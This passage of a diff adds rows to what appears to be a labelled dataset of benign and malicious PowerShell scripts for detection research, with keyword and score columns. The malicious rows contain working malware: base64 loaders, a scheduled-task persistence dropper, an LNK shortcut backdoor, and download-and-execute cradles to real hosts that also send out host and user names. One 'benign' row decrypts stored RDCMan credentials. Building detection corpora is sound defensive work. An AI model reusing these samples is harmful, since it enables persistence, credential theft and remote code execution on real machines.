+	    $output = New-Object System.IO.MemoryStream
+        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+	    $gzipStream.CopyTo( $output )
+        $gzipStream.Close()
+		$input.Close()
+		[byte[]] $byteOutArray = $output.ToArray()
+        Write-Output $byteOutArray
+    }
+}
+
+
+function Write-StreamToDisk {
+    
+    [io.file]::WriteAllBytes(""$outputloc"",$(Get-DecompressedByteArray -byteArray $([System.Convert]::FromBase64String($memstream))))
+
+}
+
+Write-StreamToDisk -memstream $memstream -outputloc $outputloc",35,benign,FromBase64String,True,benign,-0.859375
+1298.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,3,True,1084,1084,False,"$path= ""$env:userprofile\appdata\local\microsoft\Windows""
+
+if(-not(Test-Path -Path($path)))
+{mkdir $path}
+
+$fileout=""$path\L69742.vbs"";
+
+$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";
+
+$bytevbs=[System.Convert]::FromBase64String($encstrvbs);
+
+$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);
+
+$strvbs = $strvbs.replace('
+
+set-content $fileout $strvbs;
+
+$tmpfile=""$env:TEMP\U1848931.TMP"";
+
+
+
+$pscode_b64  =get-content $tmpfile | out-string;
+
+$pscode_b64=$pscode_b64.trim();
+
+
+$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))
+
+$id = [string](get-random -min 10000 -max 100000)
+
+$pscode = $pscode.replace('
+
+set-content ""$path\mc.ps1"" $pscode
+
+
+$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";
+
+
+
+iex 'cmd /c $taskstr';",35,malicious,FromBase64String,True,malicious,3.578125
+2781.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,1062,1062,False,"[CmdletBinding()] 
+    
+Param ([Parameter(Mandatory)] [string[]] $memstream = $(Throw(""-memstream is required"")),
+       [Parameter(Mandatory)] [string[]] $outputloc = $(Throw(""-outputloc is required""))
+)
+
+function Get-DecompressedByteArray {
+
+	[CmdletBinding()] Param ([Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [byte[]] $byteArray)
+
+	Process {
+	    Write-Verbose ""Get-DecompressedByteArray""
+        $input = New-Object System.IO.MemoryStream( , $byteArray )
+	    $output = New-Object System.IO.MemoryStream
+        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+	    $gzipStream.CopyTo( $output )
+        $gzipStream.Close()
+		$input.Close()
+		[byte[]] $byteOutArray = $output.ToArray()
+        Write-Output $byteOutArray
+    }
+}
+
+
+function Write-StreamToDisk {
+    
+    [io.file]::WriteAllBytes(""$outputloc"",$(Get-DecompressedByteArray -byteArray $([System.Convert]::FromBase64String($memstream))))
+
+}
+
+Write-StreamToDisk -memstream $memstream -outputloc $outputloc",36,benign,FromBase64String,True,benign,-0.859375
+2546.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,3,True,1084,1084,False,"$path= ""$env:userprofile\appdata\local\microsoft\Windows""
+
+if(-not(Test-Path -Path($path)))
+{mkdir $path}
+
+$fileout=""$path\L69742.vbs"";
+
+$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";
+
+$bytevbs=[System.Convert]::FromBase64String($encstrvbs);
+
+$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);
+
+$strvbs = $strvbs.replace('
+
+set-content $fileout $strvbs;
+
+$tmpfile=""$env:TEMP\U1848931.TMP"";
+
+
+
+$pscode_b64  =get-content $tmpfile | out-string;
+
+$pscode_b64=$pscode_b64.trim();
+
+
+$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))
+
+$id = [string](get-random -min 10000 -max 100000)
+
+$pscode = $pscode.replace('
+
+set-content ""$path\mc.ps1"" $pscode
+
+
+$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";
+
+
+
+iex 'cmd /c $taskstr';",36,malicious,FromBase64String,True,malicious,3.578125
+2781.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,1062,1062,False,"[CmdletBinding()] 
+    
+Param ([Parameter(Mandatory)] [string[]] $memstream = $(Throw(""-memstream is required"")),
+       [Parameter(Mandatory)] [string[]] $outputloc = $(Throw(""-outputloc is required""))
+)
+
+function Get-DecompressedByteArray {
+
+	[CmdletBinding()] Param ([Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [byte[]] $byteArray)
+
+	Process {
+	    Write-Verbose ""Get-DecompressedByteArray""
+        $input = New-Object System.IO.MemoryStream( , $byteArray )
+	    $output = New-Object System.IO.MemoryStream
+        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+	    $gzipStream.CopyTo( $output )
+        $gzipStream.Close()
+		$input.Close()
+		[byte[]] $byteOutArray = $output.ToArray()
+        Write-Output $byteOutArray
+    }
+}
+
+
+function Write-StreamToDisk {
+    
+    [io.file]::WriteAllBytes(""$outputloc"",$(Get-DecompressedByteArray -byteArray $([System.Convert]::FromBase64String($memstream))))
+
+}
+
+Write-StreamToDisk -memstream $memstream -outputloc $outputloc",37,benign,FromBase64String,True,benign,-0.859375
+905.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,3,True,1084,1084,False,"$path= ""$env:userprofile\appdata\local\microsoft\Windows""
+
+if(-not(Test-Path -Path($path)))
+{mkdir $path}
+
+$fileout=""$path\L69742.vbs"";
+
+$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";
+
+$bytevbs=[System.Convert]::FromBase64String($encstrvbs);
+
+$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);
+
+$strvbs = $strvbs.replace('
+
+set-content $fileout $strvbs;
+
+$tmpfile=""$env:TEMP\U1848931.TMP"";
+
+
+
+$pscode_b64  =get-content $tmpfile | out-string;
+
+$pscode_b64=$pscode_b64.trim();
+
+
+$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))
+
+$id = [string](get-random -min 10000 -max 100000)
+
+$pscode = $pscode.replace('
+
+set-content ""$path\mc.ps1"" $pscode
+
+
+$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";
+
+
+
+iex 'cmd /c $taskstr';",37,malicious,FromBase64String,True,malicious,3.59375
+4207.ps1,benign,natural_overlap,FromBase64String,FromBase64String,2,True,1883,1883,False,"﻿function Decrypt-RDCMan ($FilePath) {
+
+    if (!$FilePath) {
+        [xml]$config = Get-Content ""$env:LOCALAPPDATA\microsoft\remote desktop connection manager\rdcman.settings""
+        $Xml = Select-Xml -Xml $config -XPath ""//FilesToOpen/*""
+        $Xml | select-object -ExpandProperty ""Node""| % {Write-Output ""Decrypting file: "" $_.InnerText; Decrypt-RDCMan $_.InnerText}
+    } else {
+    [xml]$Types = Get-Content $FilePath
+
+    $Xml = Select-Xml -Xml $Types -XPath ""//logonCredentials""
+
+    
+    $Xml | select-object -ExpandProperty ""Node"" | % { $pass = Decrypt-DPAPI $_.Password; $_.Domain + ""\"" + $_.Username + "" - "" + $Pass + "" - "" + ""Hash:"" + $_.Password + ""`n"" } 
+
+    
+    $Xml | select-object -ExpandProperty ""Node"" | % { $pass = Decrypt-DPAPI $_.Password.""
+    }
+}
+
+function Decrypt-DPAPI ($EncryptedString) {
+    
+    Add-Type -assembly System.Security
+    $encoding= [System.Text.Encoding]::ASCII
+    $uencoding = [System.Text.Encoding]::UNICODE
+
+    
+    try {
+    	$encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
+        $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+        [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
+        echo $myStr1
+    } 
+    catch {
+        
+        try {
+            $encryptedBytes = [System.Convert]::FromBase64String($encryptedstring)
+            $bytes1 = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)
+            [System.Text.Encoding]::Convert([System.Text.Encoding]::UNICODE, $encoding, $bytes1) | % { $myStr1 += [char]$_}
+            echo $myStr1
+        }
+	    catch {
+            echo ""Could not decrypt password""
+        }
+    }
+}",38,benign,FromBase64String,True,benign,-2.328125
+git_53.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,2,True,1966,1966,False,"function Invoke-BackdoorLNK {
+
+
+    [CmdletBinding()] Param(
+        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
+        [ValidateScript({Test-Path -Path $_ })]
+        [String]
+        $LNKPath,
+
+        [String]
+        $EncScript,
+
+        [String]
+        $RegPath = 'HKCU:\Software\Microsoft\Windows\debug',
+
+        [Switch]
+        $Cleanup
+    )
+
+    $RegParts = $RegPath.split(""\"")
+    $Path = $RegParts[0..($RegParts.Count-2)] -join ""\""
+    $Name = $RegParts[-1]
+
+
+    $Obj = New-Object -ComObject WScript.Shell
+    $LNK = $Obj.CreateShortcut($LNKPath)
+
+    
+    $TargetPath = $LNK.TargetPath
+    $WorkingDirectory = $LNK.WorkingDirectory
+    $IconLocation = $LNK.IconLocation
+
+    if($CleanUp) {
+
+        
+        $OriginalPath = ($IconLocation -split "","")[0]
+
+        $LNK.TargetPath = $OriginalPath
+        $LNK.Arguments = $Null
+        $LNK.WindowStyle = 1
+        $LNK.Save()
+
+        
+        $null = Remove-ItemProperty -Force -Path $Path -Name $Name
+    }
+    else {
+
+        if(!$EncScript -or $EncScript -eq '') {
+            throw ""-EncScript or -Cleanup required!""
+        }
+
+        
+        $null = Set-ItemProperty -Force -Path $Path -Name $Name -Value $EncScript
+
+        ""[*] B64 script stored at '$RegPath'`n""
+
+        
+        $LNK.TargetPath = ""$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe""
+
+        
+        $LaunchString = '[System.Diagnostics.Process]::Start(""'+$TargetPath+'"");IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp '+$Path+' '+$Name+').'+$Name+')))'
+
+        $LaunchBytes  = [System.Text.Encoding]::UNICODE.GetBytes($LaunchString)
+        $LaunchB64 = [System.Convert]::ToBase64String($LaunchBytes)
+
+        $LNK.Arguments = ""-w hidden -nop -enc $LaunchB64""
+
+        
+        $LNK.WorkingDirectory = $WorkingDirectory
+        $LNK.IconLocation = ""$TargetPath,0""
+        $LNK.WindowStyle = 7
+        $LNK.Save()
+
+        ""[*] .LNK at $LNKPath set to trigger`n""
+    }
+}",38,malicious,FromBase64String,True,malicious,5.09375
+1444.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,740,740,False,"function ConvertFrom-CBase64
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
+        [AllowNull()]
+        [AllowEmptyString()]
+        [string[]]
+        
+        $Value,
+        
+        [Text.Encoding]
+        
+        $Encoding = ([Text.Encoding]::Unicode)
+    )
+    
+    begin
+    {
+        Set-StrictMode -Version 'Latest'
+
+        Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
+    }
+
+    process
+    {
+        $Value | ForEach-Object {
+            if( $_ -eq $null )
+            {
+                return $null
+            }
+            
+            $bytes = [Convert]::FromBase64String($_)
+            $Encoding.GetString($bytes)
+        }
+    }
+}",39,benign,FromBase64String,True,benign,-3.4375
+2139.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,4,True,857,857,False,"$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider; $vc=$env:computername; $vu=$env:username; $vh=[system.convert]::tobase64string($sha1.ComputeHash([system.text.encoding]::utf8.getbytes($vc+$vu+$(gwmi win32_bios)))); $vs=[system.convert]::tobase64string([system.text.encoding]::utf8.getbytes($vc+'|'+$vu+'|'+'903f2f8cf535578b8c63dfcf5f1d3f549e489101')); $u='http://vanity-fair.org/news/rss.php?q='+$vs; $ps=(New-Object Net.WebClient).DownloadString($u); $ps=[Convert]::FromBase64String($ps); $n=$ps[0]; $k=$ps[1..$n]; $d=$ps[($n+1)..$ps.count]; for ($i=0; $i -lt $d.count -and $i -lt 1024; $i++){ $d[$i] = $d[$i] -bxor $k[$i % $n]; }; iex $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$d)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()",39,malicious,FromBase64String,True,malicious,8.0390625
+1444.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,740,740,False,"function ConvertFrom-CBase64
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
+        [AllowNull()]
+        [AllowEmptyString()]
+        [string[]]
+        
+        $Value,
+        
+        [Text.Encoding]
+        
+        $Encoding = ([Text.Encoding]::Unicode)
+    )
+    
+    begin
+    {
+        Set-StrictMode -Version 'Latest'
+
+        Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
+    }
+
+    process
+    {
+        $Value | ForEach-Object {
+            if( $_ -eq $null )
+            {
+                return $null
+            }
+            
+            $bytes = [Convert]::FromBase64String($_)
+            $Encoding.GetString($bytes)
+        }
+    }
+}",40,benign,FromBase64String,True,benign,-3.4375
+2792.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,8,True,882,882,False,"$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
+$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
+$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
+$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
+$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
+while($true){
+	try{
+		$wc.headers.add('user-agent',$u);
+		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
+	}
+	catch{
+		sleep 180;
+	}
+}",40,malicious,FromBase64String,True,malicious,5.078125
+1444.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,740,740,False,"function ConvertFrom-CBase64
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
+        [AllowNull()]
+        [AllowEmptyString()]
+        [string[]]
+        
+        $Value,
+        
+        [Text.Encoding]
+        
+        $Encoding = ([Text.Encoding]::Unicode)
+    )
+    
+    begin
+    {
+        Set-StrictMode -Version 'Latest'
+
+        Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
+    }
+
+    process
+    {
+        $Value | ForEach-Object {
+            if( $_ -eq $null )
+            {
+                return $null
+            }
+            
+            $bytes = [Convert]::FromBase64String($_)
+            $Encoding.GetString($bytes)
+        }
+    }
+}",41,benign,FromBase64String,True,benign,-3.4375
+3988.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,8,True,882,882,False,"$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
+$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
+$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
+$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
+$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
+while($true){
+	try{
+		$wc.headers.add('user-agent',$u);
+		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
+	}
+	catch{
+		sleep 180;
+	}
+}",41,malicious,FromBase64String,True,malicious,5.046875
+2781.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,1062,1062,False,"[CmdletBinding()] 
+    
+Param ([Parameter(Mandatory)] [string[]] $memstream = $(Throw(""-memstream is required"")),
+       [Parameter(Mandatory)] [string[]] $outputloc = $(Throw(""-outputloc is required""))
+)
+
+function Get-DecompressedByteArray {
+
+	[CmdletBinding()] Param ([Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [byte[]] $byteArray)
+
+	Process {
+	    Write-Verbose ""Get-DecompressedByteArray""
+        $input = New-Object System.IO.MemoryStream( , $byteArray )
+	    $output = New-Object System.IO.MemoryStream
+        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+	    $gzipStream.CopyTo( $output )
+        $gzipStream.Close()
+		$input.Close()
+		[byte[]] $byteOutArray = $output.ToArray()
+        Write-Output $byteOutArray
+    }
+}
+
+
+function Write-StreamToDisk {
+    
+    [io.file]::WriteAllBytes(""$outputloc"",$(Get-DecompressedByteArray -byteArray $([System.Convert]::FromBase64String($memstream))))
+
+}
+
+Write-StreamToDisk -memstream $memstream -outputloc $outputloc",42,benign,FromBase64String,True,benign,-0.859375
+2792.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,8,True,882,882,False,"$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
+$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
+$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
+$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
+$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
+while($true){
+	try{
+		$wc.headers.add('user-agent',$u);
+		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
+	}
+	catch{
+		sleep 180;
+	}
+}",42,malicious,FromBase64String,True,malicious,5.078125
+2781.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,1062,1062,False,"[CmdletBinding()] 
+    
+Param ([Parameter(Mandatory)] [string[]] $memstream = $(Throw(""-memstream is required"")),
+       [Parameter(Mandatory)] [string[]] $outputloc = $(Throw(""-outputloc is required""))
+)
+
+function Get-DecompressedByteArray {
+
+	[CmdletBinding()] Param ([Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [byte[]] $byteArray)
+
+	Process {
+	    Write-Verbose ""Get-DecompressedByteArray""
+        $input = New-Object System.IO.MemoryStream( , $byteArray )
+	    $output = New-Object System.IO.MemoryStream
+        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+	    $gzipStream.CopyTo( $output )
+        $gzipStream.Close()
+		$input.Close()
+		[byte[]] $byteOutArray = $output.ToArray()
+        Write-Output $byteOutArray
+    }
+}
+
+
+function Write-StreamToDisk {
+    
+    [io.file]::WriteAllBytes(""$outputloc"",$(Get-DecompressedByteArray -byteArray $([System.Convert]::FromBase64String($memstream))))
+
+}
+
+Write-StreamToDisk -memstream $memstream -outputloc $outputloc",43,benign,FromBase64String,True,benign,-0.859375
+3988.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,8,True,882,882,False,"$uuid=(get-wmiobject win32_computersystemproduct).UUID;$wc=New-Object System.Net.WebClient;
+$u='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.363 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.363';
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid; c=x3c93dlfcu53"");
+$wc.Headers.Add('user-agent',$u);$reg=$wc.downloadstring(""https://www.appstats.pw/index.php"");
+$wc.Headers.Remove([System.Net.HttpRequestHeader]::Cookie);
+$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, ""u=$uuid"");
+$wc.headers.add('user-agent',$u);IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/3del.php""))));
+while($true){
+	try{
+		$wc.headers.add('user-agent',$u);
+		IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($wc.downloadstring(""https://www.appstats.pw/index.php""))));
+	}
+	catch{
+		sleep 180;
+	}
+}",43,malicious,FromBase64String,True,malicious,5.046875
+2781.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,1062,1062,False,"[CmdletBinding()] 
+    
+Param ([Parameter(Mandatory)] [string[]] $memstream = $(Throw(""-memstream is required"")),
+       [Parameter(Mandatory)] [string[]] $outputloc = $(Throw(""-outputloc is required""))
+)
+
+function Get-DecompressedByteArray {
+
+	[CmdletBinding()] Param ([Parameter(ValueFromPipeline,ValueFromPipelineByPropertyName)]
+        [byte[]] $byteArray)
+
+	Process {
+	    Write-Verbose ""Get-DecompressedByteArray""
+        $input = New-Object System.IO.MemoryStream( , $byteArray )
+	    $output = New-Object System.IO.MemoryStream
+        $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
+	    $gzipStream.CopyTo( $output )
+        $gzipStream.Close()
+		$input.Close()
+		[byte[]] $byteOutArray = $output.ToArray()
+        Write-Output $byteOutArray
+    }
+}
+
+
+function Write-StreamToDisk {
+    
+    [io.file]::WriteAllBytes(""$outputloc"",$(Get-DecompressedByteArray -byteArray $([System.Convert]::FromBase64String($memstream))))
+
+}
+
+Write-StreamToDisk -memstream $memstream -outputloc $outputloc",44,benign,FromBase64String,True,benign,-0.859375
+2139.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,4,True,857,857,False,"$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider; $vc=$env:computername; $vu=$env:username; $vh=[system.convert]::tobase64string($sha1.ComputeHash([system.text.encoding]::utf8.getbytes($vc+$vu+$(gwmi win32_bios)))); $vs=[system.convert]::tobase64string([system.text.encoding]::utf8.getbytes($vc+'|'+$vu+'|'+'903f2f8cf535578b8c63dfcf5f1d3f549e489101')); $u='http://vanity-fair.org/news/rss.php?q='+$vs; $ps=(New-Object Net.WebClient).DownloadString($u); $ps=[Convert]::FromBase64String($ps); $n=$ps[0]; $k=$ps[1..$n]; $d=$ps[($n+1)..$ps.count]; for ($i=0; $i -lt $d.count -and $i -lt 1024; $i++){ $d[$i] = $d[$i] -bxor $k[$i % $n]; }; iex $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$d)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()",44,malicious,FromBase64String,True,malicious,8.0390625
+1238.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,288,288,False,"[CmdletBinding()]
+param(
+    [Parameter(Mandatory=$true)]
+    [string]
+    $Name
+)
+
+Set-StrictMode -Version 'Latest'
+
+$Name = [Text.Encoding]::Unicode.GetString( [Convert]::FromBase64String($Name) ) 
+[Environment]::SetEnvironmentVariable( $Name, $null, [EnvironmentVariableTarget]::User )",45,benign,FromBase64String,True,benign,-1.125
+3780.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,2,True,499,499,False,"sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TY9NawIxFEX3gv8hDC5ayiRCWxcDImWK4EZLS+lCu5hJ3micTDImL/Px7/t0U5ePe+7hvoct9OmuPINE9jUGhIZvAfkPlLnRYPGRf3g3jDz3oOjUhQlsyfZ36H+SF/IEv1n2DlURDVLYO1/fNaeT6WQWvSFDckJsQyaEMlx515ZuiAG8dBYJ5tI1Iog+wGsXnkdVN+fLcRCV8+to36yiTZVGXi5eVsos5wlpK22AvDOwXUbTWvbEkkNTGC21i+GKErWxnashpe8+4RIhIEu/vWa3Teku4voquan+AA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()",45,malicious,FromBase64String,True,malicious,1.0625
+1670.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,498,498,False,"function ConvertTo-Bytes {
+    param (
+        [string]$file
+    )
+
+    if (!$file -or !(Test-Path $file)) {
+        throw ""file not found: '$file'""
+    }
+
+    [convert]::ToBase64String((Get-Content $file -Encoding Byte))
+}
+
+function ConvertFrom-Bytes {
+    param (
+        [string]$bytes,
+        [string]$savepath
+    )
+
+    $dir = Split-Path $savepath
+    if (!(Test-Path $dir)) {
+        md $dir | Out-Null
+    }
+
+    [convert]::FromBase64String($bytes) | Set-Content $savepath -Encoding Byte
+}",46,benign,FromBase64String,True,benign,-4.765625
+3537.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,6,True,282,282,False,$i = 0; $k = '1234'; IEX((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/is.txt'));Test-Querty -Querty ([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/pl.txt')) | %{ $_ -bXor $k[$i++ % $k.length] }) -Force,46,malicious,FromBase64String,True,malicious,0.5
+1444.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,740,740,False,"function ConvertFrom-CBase64
+{
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
+        [AllowNull()]
+        [AllowEmptyString()]
+        [string[]]
+        
+        $Value,
+        
+        [Text.Encoding]
+        
+        $Encoding = ([Text.Encoding]::Unicode)
+    )
+    
+    begin
+    {
+        Set-StrictMode -Version 'Latest'
+
+        Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
+    }
+
+    process
+    {
+        $Value | ForEach-Object {
+            if( $_ -eq $null )
+            {
+                return $null
+            }
+            
+            $bytes = [Convert]::FromBase64String($_)
+            $Encoding.GetString($bytes)
+        }
+    }
+}",47,benign,FromBase64String,True,benign,-3.4375
+3780.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,2,True,499,499,False,"sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TY9NawIxFEX3gv8hDC5ayiRCWxcDImWK4EZLS+lCu5hJ3micTDImL/Px7/t0U5ePe+7hvoct9OmuPINE9jUGhIZvAfkPlLnRYPGRf3g3jDz3oOjUhQlsyfZ36H+SF/IEv1n2DlURDVLYO1/fNaeT6WQWvSFDckJsQyaEMlx515ZuiAG8dBYJ5tI1Iog+wGsXnkdVN+fLcRCV8+to36yiTZVGXi5eVsos5wlpK22AvDOwXUbTWvbEkkNTGC21i+GKErWxnashpe8+4RIhIEu/vWa3Teku4voquan+AA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()",47,malicious,FromBase64String,True,malicious,1.0625
+1444.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,740,740,False,"function ConvertFrom-CBase64
